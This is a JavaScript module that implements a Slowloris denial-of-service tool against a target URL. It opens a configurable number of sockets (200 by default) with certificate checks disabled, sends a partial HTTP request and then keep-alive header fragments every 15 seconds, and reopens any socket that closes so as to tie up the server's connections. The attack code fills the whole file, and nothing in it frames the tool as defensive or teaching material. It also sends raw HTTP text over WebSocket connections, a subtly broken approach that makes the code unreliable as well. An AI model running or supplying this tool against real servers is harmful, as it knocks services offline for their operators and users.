import { WebSocket } from 'ws';

function slowloris(target, numSockets) {
    if (!target) {
        console.error("Target URL is required.");
        return;
    }

    try {
        const parsedTarget = new URL(target);
        const hostname = parsedTarget.hostname;
        const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
        const isSecure = parsedTarget.protocol === 'https:';
        const path = parsedTarget.pathname || "/";

        if (!numSockets || numSockets <= 0) {
            numSockets = 200;
        }

        console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);

        const sockets = new Array(numSockets);
        let openSockets = 0; // Track the number of open sockets

        for (let i = 0; i < numSockets; i++) {
            createSocket(hostname, port, i, isSecure, path);
        }

        function createSocket(hostname, port, index, isSecure, path) {
            let socket;
            try {
                const protocol = isSecure ? 'wss:' : 'ws:';
                socket = new WebSocket(`${protocol}//${hostname}:${port}${path}`, {
                    origin: `${protocol}//${hostname}`,
                    rejectUnauthorized: false,
                });

                sockets[index] = socket;

                socket.on('open', () => {
                    console.log(`Socket ${index + 1} opened.`);
                    openSockets++;
                    sendInitialHeader(socket, hostname, path);
                    setInterval(() => {
                        sendKeepAliveHeader(socket);
                    }, 15000);
                });

                socket.on('close', () => {
                    console.log(`Socket ${index + 1} closed.`);
                    openSockets--;
                    cleanupSocket(socket, index);
                    // Recreate the socket to maintain the desired number of sockets
                    setTimeout(() => {
                        createSocket(hostname, port, index, isSecure, path);
                    }, 100); // Add a small delay before recreating the socket
                });

                socket.on('error', (error) => {
                    console.error(`Socket ${index + 1} error: ${error.message}`);
                    openSockets--;
                    cleanupSocket(socket, index);
                    // Recreate the socket to maintain the desired number of sockets
                    setTimeout(() => {
                        createSocket(hostname, port, index, isSecure, path);
                    }, 100); // Add a small delay before recreating the socket
                });
            } catch (socketError) {
                console.error(`Error creating socket ${index + 1}:`, socketError);
                 openSockets--; // Decrement openSockets on creation failure
                cleanupSocket(socket, index);
                // Recreate the socket to maintain the desired number of sockets
                  setTimeout(() => {
                        createSocket(hostname, port, index, isSecure, path);
                    }, 100); // Add a small delay before recreating the socket
            }
        }

        function sendInitialHeader(socket, hostname, path) {
            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n`;
            try {
                if (socket.readyState === WebSocket.OPEN) {
                    socket.send(initialHeader);
                } else {
                    console.warn(`Socket ${sockets.indexOf(socket) + 1}: Not open, cannot send initial header.`);
                    cleanupSocket(socket);
                }
            } catch (error) {
                console.error("Error sending initial header:", error);
                cleanupSocket(socket);
            }
        }

        function sendKeepAliveHeader(socket) {
            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
            try {
                if (socket.readyState === WebSocket.OPEN) {
                    socket.send(keepAliveHeader);
                } else {
                    console.warn(`Socket ${sockets.indexOf(socket) + 1}: Not open, cannot send keep-alive header.`);
                    cleanupSocket(socket);
                }
            } catch (error) {
                console.error("Error sending keep-alive header:", error);
                cleanupSocket(socket);
            }
        }

        function cleanupSocket(socket, index) {
            try {
                if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
                    socket.close();
                }
            } catch (closeError) {
                if (index !== undefined) {
                    console.error(`Error closing socket ${index + 1}:`, closeError);
                } else {
                    console.error("Error closing socket:", closeError);
                }
            } finally {
                if (index !== undefined && sockets[index] === socket) {
                    sockets[index] = null;
                } else {
                    const socketIndex = sockets.indexOf(socket);
                    if (socketIndex > -1) {
                        sockets[socketIndex] = null;
                    }
                }
            }
        }
    } catch (error) {
        console.error("Error during Slowloris setup:", error);
    }
}

export { slowloris };